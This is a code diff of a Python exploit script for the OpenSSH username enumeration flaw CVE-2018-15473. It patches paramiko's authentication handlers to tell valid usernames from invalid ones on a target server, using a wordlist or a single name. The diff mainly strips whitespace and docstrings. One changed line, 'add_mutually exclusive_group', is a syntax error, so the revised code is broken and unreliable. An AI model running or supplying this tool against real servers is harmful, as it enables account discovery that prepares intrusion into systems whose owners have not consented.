@@ -12,7 +12,6 @@ import paramiko
 
 assert sys.version_info >= (3, 6), "This program requires python3.6 or higher"
 
-
 class Color:
     """ Class for coloring print statements. """
     BOLD = '\033[1m'
@@ -25,12 +24,10 @@ class Color:
     @staticmethod
     def string(string: str, color: str, bold: bool = False) -> str:
         """ Prints the given string in a few different colors.
-
         Args:
             string: string to be printed
             color:  valid colors "red", "blue", "green", "yellow"
             bold:   T/F to add ANSI bold code
-
         Returns:
             ANSI color-coded string (str)
         """
@@ -38,28 +35,14 @@ class Color:
         colorstr = getattr(Color, color.upper())
         return f'{boldstr}{colorstr}{string}{Color.ENDC}'
 
-
 class InvalidUsername(Exception):
     """ Raise when username not found via CVE-2018-15473. """
 
-
 def apply_monkey_patch() -> None:
     """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
-
         patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
             _parse_service_accept
             _parse_userauth_failure
-
-        _handler_table = {
-            MSG_SERVICE_REQUEST: _parse_service_request,
-            MSG_SERVICE_ACCEPT: _parse_service_accept,
-            MSG_USERAUTH_REQUEST: _parse_userauth_request,
-            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
-            MSG_USERAUTH_FAILURE: _parse_userauth_failure,
-            MSG_USERAUTH_BANNER: _parse_userauth_banner,
-            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
-            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
-        }
     """
 
     def patched_add_boolean(*args, **kwargs):
@@ -80,15 +63,11 @@ def apply_monkey_patch() -> None:
         """ Called during authentication when a username is not found. """
         raise InvalidUsername(*args, **kwargs)
 
-    auth_handler._client_handler_table.update({
-        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
-        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
-    })
-
+    auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = patched_msg_service_accept
+    auth_handler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = patched_userauth_failure
 
 def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
     """ Small helper to stay DRY.
-
     Returns:
         socket.socket or None
     """
@@ -98,16 +77,13 @@ def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
         print(f'socket error: {e}', file=sys.stdout)
         return None
 
-
 def connect(username: str, hostname: str, port: int, verbose: bool = False) -> None:
     """ Connect and attempt keybased auth, result interpreted to determine valid username.
-
     Args:
         username:   username to check against the ssh service
         hostname:   hostname/IP of target
         port:       port where ssh is listening
         verbose:    bool value; determines whether to print 'not found' lines or not
-
     Returns:
         None
     """
@@ -131,7 +107,6 @@ def connect(username: str, hostname: str, port: int, verbose: bool = False) -> N
         if verbose:
             print(f'[-] {Color.string(username, color="red")} no encontrado')
 
-
 def main():
     """ main entry point for the program """
     parser = argparse.ArgumentParser(description="OpenSSH Username Enumeration (CVE-2018-15473)")
@@ -143,7 +118,7 @@ def main():
                         help="print both valid and invalid usernames (default: False)")
     parser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")
 
-    multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
+    multi_or_single_group = parser.add_mutually exclusive_group(required=True)
     multi_or_single_group.add_argument('-w', '--wordlist', type=str, help="path to wordlist")
     multi_or_single_group.add_argument('-u', '--username', help='a single username to test', type=str)
 
@@ -182,6 +157,6 @@ def main():
             verbose = args.verbose
             pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])
 
-
 if __name__ == '__main__':
     main()
+
